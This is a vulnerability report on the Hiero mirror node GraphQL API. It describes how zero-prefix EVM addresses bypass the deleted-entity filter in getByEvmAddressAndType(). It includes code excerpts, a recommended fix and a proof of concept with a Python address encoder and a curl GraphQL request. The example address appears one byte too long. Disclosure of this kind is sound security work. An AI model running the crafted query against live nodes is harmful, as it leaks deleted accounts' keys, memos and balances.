### Title
Soft-Deleted Entity Disclosure via Zero-Prefix EVM Address in GraphQL `getByEvmAddressAndType()`

### Summary
In `EntityServiceImpl.getByEvmAddressAndType()`, when the supplied EVM address has its first 12 bytes set to zero (the "long-zero" / mirror address format), the code routes to `entityRepository.findById()` — a standard Spring Data `CrudRepository` method that carries no `deleted is not true` filter. Any unauthenticated user can craft such an address encoding a known deleted entity's numeric ID and retrieve the full soft-deleted entity record via the public GraphQL API.

### Finding Description

**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 34–41:

```java
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {          // bytes 0-11 == 0
        return entityRepository.findById(buffer.getLong())         // bytes 12-19 → entity ID
                               .filter(e -> e.getType() == type); // only type check, NO deletion check
    }
    return entityRepository.findByEvmAddress(evmAddressBytes)
                           .filter(e -> e.getType() == type);
}
``` [1](#0-0) 

**Root cause:** The `findByEvmAddress` custom query explicitly guards against deleted records:

```sql
select * from entity where evm_address = ?1 and deleted is not true
``` [2](#0-1) 

But the zero-prefix branch calls the inherited `CrudRepository.findById()`, which issues a plain `SELECT * FROM entity WHERE id = ?` with no deletion predicate. The only post-fetch filter is `e.getType() == type`, which does not check `deleted`. [3](#0-2) 

**Exploit flow:**
1. Attacker identifies a deleted entity's numeric ID (Hedera entity IDs are sequential and publicly observable on-chain or via other mirror node endpoints).
2. Attacker constructs a 20-byte zero-prefix EVM address: bytes 0–11 = `0x00`, bytes 12–19 = the target entity ID as a big-endian `long`.
   - Example for entity ID `12345` (0x3039): `0x000000000000000000000000000000000000003039`
3. Attacker sends a GraphQL query to the public `/graphql/alpha` endpoint:
   ```graphql
   query {
     account(input: { evmAddress: "000000000000000000000000000000000000003039" }) {
       deleted key memo balance alias
     }
   }
   ```
4. The service takes the `findById` branch, retrieves the deleted entity, passes the type filter, and returns the full record.

### Impact Explanation

The GraphQL `Account` and `Contract` types expose sensitive fields including `key` (admin key), `memo`, `balance`, `alias`, `autoRenewAccount`, and `obtainer` for the returned entity. [4](#0-3) 

Soft-deleted entities represent accounts/contracts that have been explicitly deleted on the Hedera network. Returning them violates the intended access-control invariant (enforced consistently everywhere else in the codebase) and leaks historical key material, memo content, and balance data for entities that should no longer be visible.

### Likelihood Explanation

- **No authentication required:** The GraphQL endpoint is public.
- **No special knowledge required:** Hedera entity IDs are sequential integers. An attacker can enumerate them trivially or observe deleted accounts from public transaction history.
- **Trivially repeatable:** A single HTTP POST with a crafted hex string is sufficient.
- **Consistent pattern:** The same missing deletion filter exists in `getByIdAndType()` (line 25), confirming this is a systemic oversight rather than an isolated edge case. [5](#0-4) 

### Recommendation

Replace the bare `findById` call in the zero-prefix branch with a deletion-aware query. Add a custom method to `EntityRepository`:

```java
@Query(value = "select * from entity where id = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByIdAndNotDeleted(Long id);
```

Then update `EntityServiceImpl`:

```java
if (buffer.getInt() == 0 && buffer.getLong() == 0) {
    return entityRepository.findByIdAndNotDeleted(buffer.getLong())
                           .filter(e -> e.getType() == type);
}
```

Apply the same fix to `getByIdAndType()` for consistency.

### Proof of Concept

**Precondition:** A deleted entity with numeric ID `N` exists in the mirror node database (e.g., `deleted = true`, `id = 12345`).

**Steps:**

1. Encode the entity ID as a 20-byte zero-prefix EVM address:
   ```python
   entity_id = 12345
   evm_address = entity_id.to_bytes(8, 'big').rjust(20, b'\x00').hex()
   # → "000000000000000000000000000000000000003039"
   ```

2. Send the GraphQL query:
   ```bash
   curl -X POST http://<mirror-node>/graphql/alpha \
     -H 'Content-Type: application/json' \
     -d '{
       "query": "{ account(input: { evmAddress: \"000000000000000000000000000000000000003039\" }) { deleted key memo balance } }"
     }'
   ```

3. **Expected (correct) result:** `null` — entity is deleted and should not be returned.

4. **Actual result:** The full entity record is returned with `deleted: true` and all fields populated, confirming the bypass.

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L24-26)
```java
    public Optional<Entity> getByIdAndType(EntityId entityId, EntityType type) {
        return entityRepository.findById(entityId.getId()).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L34-41)
```java
    public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
        byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
        var buffer = ByteBuffer.wrap(evmAddressBytes);
        if (buffer.getInt() == 0 && buffer.getLong() == 0) {
            return entityRepository.findById(buffer.getLong()).filter(e -> e.getType() == type);
        }
        return entityRepository.findByEvmAddress(evmAddressBytes).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L16-17)
```java
    @Query(value = "select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByEvmAddress(byte[] evmAddress);
```

**File:** graphql/src/main/resources/graphql/account.graphqls (L1-81)
```text
"""
Represents an account holder on the network.
"""
type Account implements Accountable & Entity & Node {
    "The unique alias associated with this account."
    alias: String

    "The account charged the auto-renewal fee."
    autoRenewAccount: Account

    "The amount of time to elapse before auto-renew occurs."
    autoRenewPeriod: Duration

    "The balance of the accountable entity. Defaults to tinybars."
    balance(unit: HbarUnit = TINYBAR): Long

    "The consensus timestamp at which the entity was created."
    createdTimestamp: Timestamp

    "Whether the entity declines receiving a staking reward."
    declineReward: Boolean!

    "Whether the entity still exists in consensus node state."
    deleted: Boolean

    "The unique identifier associated with the entity."
    entityId: EntityId!

    """
    The time at which this entity will expire and be auto-renewed, if possible. If this was not explicitly set by the
    user it will be calculated as the createdTimestamp plus the autoRenewPeriod.
    """
    expirationTimestamp: Timestamp

    "An opaque, globally unique identifier specific to GraphQL."
    id: ID!

    """
    The admin key associated with this entity whose signing requirements must be met in order to modify the entity on
    the network. This returns a dynamic map that varies per entity and may be arbitrarily complex depending upon this
    key's signing requirements.
    """
    key: Object

    "The maximum number of tokens that this account can be implicitly associated with."
    maxAutomaticTokenAssociations: Int

    "The memo associated with the entity."
    memo: String!

    "The ethereum transaction nonce associated with this account."
    nonce: Long

    "The accountable entity to receive the remaining balance from the deleted entity."
    obtainer: Accountable

    """
    The pending reward the account will receive in the next reward payout. Note the value is updated at the end of each
    staking period and there may be delay to reflect the changes in the past staking period. Defaults to tinybars.
    """
    pendingReward(unit: HbarUnit = TINYBAR): Long

    "Whether the admin key must sign any transaction depositing into this account (in addition to all withdrawals)."
    receiverSigRequired: Boolean

    "The account to which this account is staked. Mutually exclusive with stakedNode."
    stakedAccount: Account

    """
    The staking period during which either the staking settings for this account changed (such as starting staking or
    changing stakedNode) or the most recent reward was earned, whichever is later. If this account is not currently
    staked to a node, then the value is null.
    """
    stakePeriodStart: Timestamp

    "A consensus timestamp range with an inclusive from timestamp and an exclusive to timestamp."
    timestamp: TimestampRange!

    "The type of entity."
    type: EntityType!
}
```
